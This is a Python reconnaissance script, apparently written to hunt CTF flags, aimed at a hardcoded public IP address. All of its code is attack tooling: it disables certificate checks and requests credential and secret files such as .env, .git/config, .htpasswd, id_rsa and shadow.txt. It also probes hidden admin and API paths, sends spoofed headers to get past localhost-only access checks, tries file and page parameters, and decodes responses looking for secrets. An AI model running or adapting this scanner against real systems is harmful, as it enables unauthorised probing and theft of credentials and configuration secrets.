import requests
import re
import base64
import json
from urllib.parse import urljoin, urlparse

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 10

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
}

session = requests.Session()
session.verify = False
session.headers.update(HEADERS)

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    """记录找到的flag"""
    FLAGS_FOUND.append({
        "location": location,
        "content": content,
        "method": method
    })
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def check_flag_pattern(text):
    """检查文本中是否包含flag模式"""
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
        r'key\{[^}]+\}',
        r'secret\{[^}]+\}',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def decode_and_check(text):
    """尝试多种解码方式查找flag"""
    # 直接检查
    flag = check_flag_pattern(text)
    if flag:
        return flag, "明文"
    
    # Base64解码检查
    try:
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
        for b64 in b64_patterns:
            try:
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                flag = check_flag_pattern(decoded)
                if flag:
                    return flag, "Base64解码"
            except:
                pass
    except:
        pass
    
    # HTML实体解码
    try:
        import html
        decoded = html.unescape(text)
        flag = check_flag_pattern(decoded)
        if flag:
            return flag, "HTML实体解码"
    except:
        pass
    
    return None, None


def check_main_page():
    """检查主页面"""
    print_section("1. 主页面检测")
    
    try:
        r = session.get(TARGET, timeout=TIMEOUT)
        print(f"\n  状态码: {r.status_code}")
        print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")
        print(f"  页面大小: {len(r.text)} bytes")
        
        # 检查响应头
        print("\n  --- HTTP响应头 ---")
        for key, value in r.headers.items():
            print(f"  {key}: {value}")
            flag, method = decode_and_check(value)
            if flag:
                add_flag(f"响应头: {key}", flag, method)
        
        # 检查Cookie
        print("\n  --- Cookies ---")
        for cookie in r.cookies:
            print(f"  {cookie.name}: {cookie.value}")
            flag, method = decode_and_check(cookie.value)
            if flag:
                add_flag(f"Cookie: {cookie.name}", flag, method)
        
        # 检查页面内容
        if r.status_code == 200 and len(r.text) > 0:
            print("\n  --- 页面内容 ---")
            print(r.text[:500])
            
            # 检查HTML注释
            comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
            if comments:
                print("\n  --- HTML注释 ---")
                for comment in comments:
                    print(f"  注释: {comment[:100]}")
                    flag, method = decode_and_check(comment)
                    if flag:
                        add_flag("HTML注释", flag, method)
            
            # 检查页面内容中的flag
            flag, method = decode_and_check(r.text)
            if flag:
                add_flag("页面内容", flag, method)
            
            return r.text
        
        return None
    except Exception as e:
        print(f"  ❌ 请求失败: {e}")
        return None


def check_hidden_files():
    """检查隐藏文件"""
    print_section("2. 隐藏文件检测")
    
    hidden_files = [
        "robots.txt",
        "sitemap.xml",
        ".htaccess",
        ".htpasswd",
        ".env",
        ".git/HEAD",
        ".git/config",
        ".gitignore",
        ".DS_Store",
        "flag.txt",
        "flag",
        "secret.txt",
        "secret",
        "key.txt",
        "key",
        "README.md",
        "README",
        "readme.txt",
        "LICENSE",
        "config.php",
        "config.ini",
        "config.json",
        "settings.json",
        "phpinfo.php",
        "info.php",
        "test.php",
        "debug.log",
        "error.log",
        "access.log",
        "backup.txt",
        "backup.zip",
        "backup.tar",
        "admin.txt",
        "password.txt",
        "passwd.txt",
        "shadow.txt",
        "id_rsa",
        "id_rsa.pub",
        "authorized_keys",
        "web.config",
        "crossdomain.xml",
        "clientaccesspolicy.xml",
    ]
    
    for file in hidden_files:
        url = urljoin(TARGET, file)
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                print(f"\n  ✅ 找到文件: {file} ({len(r.text)} bytes)")
                
                # 显示内容
                if len(r.text) < 1000:
                    print(f"     内容: {r.text[:200]}")
                else:
                    print(f"     内容预览: {r.text[:100]}")
                
                # 检查flag
                flag, method = decode_and_check(r.text)
                if flag:
                    add_flag(f"文件: {file}", flag, method)
                
                # 检查注释
                comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
                for comment in comments:
                    flag, method = decode_and_check(comment)
                    if flag:
                        add_flag(f"文件注释: {file}", flag, method)
                        
        except:
            pass


def check_hidden_paths():
    """检查隐藏路径"""
    print_section("3. 隐藏路径探测")
    
    hidden_paths = [
        "/flag",
        "/flags",
        "/ctf",
        "/secret",
        "/admin",
        "/login",
        "/dashboard",
        "/panel",
        "/console",
        "/api",
        "/api/flag",
        "/v1/flag",
        "/v2/flag",
        "/internal",
        "/private",
        "/hidden",
        "/debug",
        "/test",
        "/backup",
        "/upload",
        "/files",
        "/download",
        "/static",
        "/assets",
        "/images",
        "/js",
        "/css",
        "/fonts",
        "/data",
        "/temp",
        "/tmp",
        "/cache",
        "/logs",
        "/config",
        "/settings",
        "/info",
        "/status",
        "/health",
        "/ping",
        "/api/v1",
        "/api/v2",
        "/swagger",
        "/swagger-ui",
        "/api-docs",
        "/docs",
        "/graphiql",
        "/graphql",
        "/playground",
    ]
    
    for path in hidden_paths:
        url = urljoin(TARGET, path)
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code in [200, 301, 302]:
                if r.status_code in [301, 302]:
                    print(f"\n  ➡️  {path} -> {r.headers.get('Location', '?')}")
                else:
                    print(f"\n  ✅ {path} ({len(r.text)} bytes)")
                    
                    if len(r.text) < 500:
                        print(f"     内容: {r.text[:200]}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"路径: {path}", flag, method)
                        
        except:
            pass


def analyze_js(html):
    """分析JavaScript代码"""
    print_section("4. JavaScript代码分析")
    
    if not html:
        print("  无页面内容")
        return
    
    # 提取JS文件
    js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)
    
    # 提取内联JS
    inline_js = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
    
    if js_files:
        print(f"\n  发现 {len(js_files)} 个外部JS文件")
        for js_file in js_files:
            url = urljoin(TARGET, js_file)
            try:
                r = session.get(url, timeout=TIMEOUT)
                if r.status_code == 200:
                    print(f"\n  分析: {js_file}")
                    
                    # 检查flag
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"JS文件: {js_file}", flag, method)
                    
                    # 检查特殊变量
                    var_patterns = [
                        r'(?:var|let|const)\s+(?:flag|FLAG|secret|key)\s*=\s*["\']([^"\']+)["\']',
                        r'(?:flag|FLAG|secret|key)\s*[:=]\s*["\']([^"\']+)["\']',
                    ]
                    for pattern in var_patterns:
                        matches = re.findall(pattern, r.text)
                        for match in matches:
                            print(f"     发现变量: {match[:50]}")
                            flag, method = decode_and_check(match)
                            if flag:
                                add_flag(f"JS变量: {js_file}", flag, method)
                                
            except:
                pass
    
    if inline_js:
        print(f"\n  发现 {len(inline_js)} 个内联JS")
        for js in inline_js:
            if len(js) > 10:
                print(f"\n  内联JS预览: {js[:100]}")
                flag, method = decode_and_check(js)
                if flag:
                    add_flag("内联JavaScript", flag, method)


def check_http_methods():
    """检查不同的HTTP方法"""
    print_section("5. HTTP方法测试")
    
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]
    
    for method in methods:
        try:
            r = session.request(method, TARGET, timeout=TIMEOUT)
            print(f"\n  {method}: [{r.status_code}]")
            
            if r.status_code != 503 and len(r.text) > 0:
                print(f"     内容: {r.text[:100]}")
                flag, method_name = decode_and_check(r.text)
                if flag:
                    add_flag(f"HTTP方法: {method}", flag, method_name)
                    
        except:
            pass


def check_special_headers():
    """检查特殊请求头"""
    print_section("6. 特殊请求头测试")
    
    special_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/flag"},
        {"X-Rewrite-URL": "/flag"},
        {"Referer": "http://localhost"},
        {"Origin": "http://localhost"},
        {"Host": "localhost"},
        {"X-Debug": "true"},
        {"X-Flag": "true"},
        {"Debug": "true"},
    ]
    
    for headers in special_headers:
        try:
            r = session.get(TARGET, headers=headers, timeout=TIMEOUT)
            print(f"\n  {headers}: [{r.status_code}]")
            
            if r.status_code != 503 and len(r.text) > 0:
                print(f"     内容: {r.text[:100]}")
                flag, method = decode_and_check(r.text)
                if flag:
                    add_flag(f"特殊头: {headers}", flag, method)
                    
        except:
            pass


def check_query_params():
    """检查查询参数"""
    print_section("7. 查询参数测试")
    
    params = [
        {"flag": "1"},
        {"debug": "1"},
        {"test": "1"},
        {"source": "1"},
        {"file": "flag.txt"},
        {"page": "flag"},
        {"id": "flag"},
        {"action": "flag"},
        {"show": "flag"},
    ]
    
    for param in params:
        try:
            r = session.get(TARGET, params=param, timeout=TIMEOUT)
            print(f"\n  ?{param}: [{r.status_code}]")
            
            if r.status_code != 503 and len(r.text) > 0:
                print(f"     内容: {r.text[:100]}")
                flag, method = decode_and_check(r.text)
                if flag:
                    add_flag(f"参数: {param}", flag, method)
                    
        except:
            pass


def main():
    print("*" * 70)
    print("  FLAG 搜索工具")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    html = check_main_page()
    check_hidden_files()
    check_hidden_paths()
    analyze_js(html)
    check_http_methods()
    check_special_headers()
    check_query_params()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG:")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  建议:")
        print("     1. 检查页面是否需要特殊认证")
        print("     2. 检查是否有验证码或其他防护")
        print("     3. 尝试浏览器手动访问，查看是否有特殊提示")
        print("     4. 检查是否有隐藏的登录页面")
    
    print()


if __name__ == "__main__":
    main()